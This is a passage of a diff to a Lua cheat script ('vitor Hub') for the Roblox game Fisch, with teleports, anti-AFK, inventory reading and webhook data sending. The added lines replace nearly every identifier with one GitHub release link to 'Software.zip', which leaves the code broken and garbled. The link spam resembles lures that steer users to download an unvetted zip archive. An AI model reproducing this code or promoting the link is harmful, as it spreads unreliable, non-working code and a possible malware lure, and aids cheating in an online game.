+		if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == NameFish then
 			ReturnCound += 1
 		end
 	end
@@ -3939,22 +3939,22 @@ end
 
 function GetFishInInventory()
 	local TableReturn = {}
-	for i,v in pairs(PlayerGui.hud.safezone.backpack.hotbar:GetChildren()) do
-		if v:FindFirstChild("tool") and table.find(FishList, tostring(v.tool.value)) then
-			local Count = v.stack.Text:match("%d+") or "1"
-			TableReturn[tostring(v.itemname.Text:gsub("<.->", "")).." X"..Count] = {
-				v.weight.Text,
-				((FISHDATA[tostring(v.tool.value)] and FISHDATA[tostring(v.tool.value)].Price) or "0").."$"
+	for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+		if v:FindFirstChild("tool") and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(FishList, tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)) then
+			local Count = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("%d+") or "1"
+			TableReturn[tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("<.->", "")).." X"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip] = {
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
+				((FISHDATA[tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)] and FISHDATA[tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)].Price) or "0").."$"
 			}
 		end
 	end
 
-	for i,v in pairs(PlayerGui.hud.safezone.backpack.inventory.scroll.safezone:GetChildren()) do
-		if table.find(FishList, v.Name) then
-			local Count = v.stack.Text:match("%d+") or "1"
-			TableReturn[tostring(v.itemname.Text:gsub("<.->", "")).." X"..Count] = {
-				v.weight.Text,
-				((FISHDATA[v.Name] and FISHDATA[v.Name].Price) or "0").."$"
+	for i,v in pairs(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()) do
+		if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(FishList, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) then
+			local Count = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("%d+") or "1"
+			TableReturn[tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("<.->", "")).." X"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip] = {
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
+				((FISHDATA[https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip] and FISHDATA[https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip].Price) or "0").."$"
 			}
 		end
 	end
@@ -3962,7 +3962,7 @@ function GetFishInInventory()
 end
 
 
-WebHookConfigsData = Tap.Configs:AddSection('Data Sending') do
+WebHookConfigsData = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('Data Sending') do
 	Toggle(WebHookConfigsData, "Current Money","","Current Money")
 	Toggle(WebHookConfigsData, "Current Level","","Current Level")
 	Toggle(WebHookConfigsData, "All Fish Inventory","","All Fish Inventory")
@@ -3972,12 +3972,12 @@ WebHookConfigsData = Tap.Configs:AddSection('Data Sending') do
 	Toggle(WebHookConfigsData, "Halloween Success","","Halloween Success")
 end
 
-Teleporting = Tap.Teleport:AddSection('Teleport') do
+Teleporting = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('Teleport') do
 	-- Teleporting button for "Sunstone Island"
 Teleporting:AddButton({
     Title = "Sunstone Island",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-913.630615234375, 137.29348754882812, -1129.8995361328125)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(-913.630615234375, 137.29348754882812, -1129.8995361328125)
     end
 })
 
@@ -3985,7 +3985,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Roslit Bay",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1501.675537109375, 133, 416.2070007324219)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(-1501.675537109375, 133, 416.2070007324219)
     end
 })
 
@@ -3993,7 +3993,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Random Islands",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(237.6944580078125, 139.34976196289062, 43.103424072265625)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(237.6944580078125, 139.34976196289062, 43.103424072265625)
     end
 })
 
@@ -4001,7 +4001,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Moosewood",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(433.7972106933594, 147.07003784179688, 261.80218505859375)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(433.7972106933594, 147.07003784179688, 261.80218505859375)
     end
 })
 
@@ -4009,7 +4009,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Executive Headquarters",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-36.46199035644531, -246.55001831054688, 205.77120971679688)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(-36.46199035644531, -246.55001831054688, 205.77120971679688)
     end
 })
 
@@ -4017,7 +4017,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Enchant Room",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1310.048095703125, -805.292236328125, -162.34507751464844)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1310.048095703125, -805.292236328125, -162.34507751464844)
     end
 })
 
@@ -4025,7 +4025,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Statue Of Sovereignty",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(22.098665237426758, 159.01470947265625, -1039.8543701171875)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(22.098665237426758, 159.01470947265625, -1039.8543701171875)
     end
 })
 
@@ -4033,7 +4033,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Mushgrove Swamp",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2442.805908203125, 130.904052734375, -686.1648559570312)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(2442.805908203125, 130.904052734375, -686.1648559570312)
     end
 })
 
@@ -4041,7 +4041,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Snowcap Island",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2589.534912109375, 134.9249267578125, 2333.099365234375)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(2589.534912109375, 134.9249267578125, 2333.099365234375)
     end
 })
 
@@ -4049,7 +4049,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Terrapin Island",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(152.3716278076172, 154.91015625, 2000.9171142578125)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(152.3716278076172, 154.91015625, 2000.9171142578125)
     end
 })
 
@@ -4057,7 +4057,7 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Enchant Relic",
     Callback = function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1309.2784423828125, -802.427001953125, -83.36397552490234)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1309.2784423828125, -802.427001953125, -83.36397552490234)
     end
 })
 
@@ -4065,19 +4065,19 @@ Teleporting:AddButton({
 Teleporting:AddButton({
     Title = "Best Spot",
     Callback = function()
-    local forceFieldPart = Instance.new("Part") -- Create a new part
-forceFieldPart.Size = Vector3.new(10, 1, 10) -- Set the size of the part (10x1x10)
-forceFieldPart.Position = Vector3.new(1447.8507080078125, 131.49998474121094, -7649.64501953125) -- Adjusted position (2 units lower)
-forceFieldPart.Anchored = true -- Make sure the part does not fall
-forceFieldPart.BrickColor = BrickColor.new("White") -- Set the color of the part to white
-forceFieldPart.Material = Enum.Material.SmoothPlastic -- Set the material of the part
-forceFieldPart.Parent = game.Workspace -- Parent the part to the Workspace
+    local forceFieldPart = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("Part") -- Create a new part
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(10, 1, 10) -- Set the size of the part (10x1x10)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1447.8507080078125, 131.49998474121094, -7649.64501953125) -- Adjusted position (2 units lower)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = true -- Make sure the part does not fall
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("White") -- Set the color of the part to white
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip -- Set the material of the part
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip -- Parent the part to the Workspace
 
 -- Create a ForceField
-local forceField = Instance.new("ForceField") -- Create a new ForceField object
-forceField.Parent = forceFieldPart -- Parent the ForceField to the part
+local forceField = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("ForceField") -- Create a new ForceField object
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = forceFieldPart -- Parent the ForceField to the part
 wait()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1447.8507080078125, 133.49998474121094, -7649.64501953125)
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(1447.8507080078125, 133.49998474121094, -7649.64501953125)
     end
 })
 end
@@ -4106,32 +4106,32 @@ function sendwebhook(url, data)
 	return success
 end
 
-local Old = os.time()
-	task.spawn(function(InitializeService)
+local Old = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip()
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function(InitializeService)
 		warn("ANTI AFK STARTING")
 		pcall(function()
-			for i,v in pairs(getconnections(Client.Idled)) do
+			for i,v in pairs(getconnections(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)) do
 				v:Disable() 
 			end
-			Client.Idled:connect(function()
-				game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function()
+				game:GetService("VirtualUser"):Button2Down(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0,0),https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 				wait(1)
-				game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+				game:GetService("VirtualUser"):Button2Up(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0,0),https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 			end)
 			while wait(300) do
-				game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+				game:GetService("VirtualUser"):Button2Down(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0,0),https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 				wait(1)
-				game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+				game:GetService("VirtualUser"):Button2Up(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0,0),https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 			end
 		end)
 	end)
 do
-	Settings_M = Tap.Settings:AddSection("Misc") do
+	Settings_M = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("Misc") do
 		Timeing = Settings_M:AddParagraph({        
 			Title = "Timeing Server"
 		})
 		Toggle(Settings_M, "Auto Loading Configs", "", "AutoLoadingConfigs", function(v)
-			writefile(tostring(LocalPlayer.UserId).."ALC.txt", tostring(v))
+			writefile(tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip).."https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip", tostring(v))
 		end)
 		Settings_M:AddButton({
 			Title = "Join vitor Hub Discord",
@@ -4142,18 +4142,18 @@ do
 		})
 	end
 
-	RunService.Heartbeat:Connect(function() -- All RunService
-		local TimeSinceLastPlay = os.time() - Old
-		local hours = tostring(math.floor(TimeSinceLastPlay / 3600))
-		local minutes = tostring(math.floor((TimeSinceLastPlay % 3600) / 60))
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function() -- All RunService
+		local TimeSinceLastPlay = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip() - Old
+		local hours = tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(TimeSinceLastPlay / 3600))
+		local minutes = tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip((TimeSinceLastPlay % 3600) / 60))
 		local seconds = tostring(TimeSinceLastPlay % 60)
-		Timeing:SetTitle("Server Joined "..hours.." H "..minutes.." M "..seconds.." S ")
+		Timeing:SetTitle("Server Joined "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip" H "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip" M "https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip" S ")
 	end)
 
 
 	InterfaceManager:SetLibrary(Fluent)
 	InterfaceManager:SetFolder("vitor Hub")
-	InterfaceManager:BuildInterfaceSection(Tap.Settings)
+	InterfaceManager:BuildInterfaceSection(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip)
 	Window:SelectTab(1)
 	SaveManager:LoadAutoloadConfig()
 	Fluent:SetTheme("Amethyst")
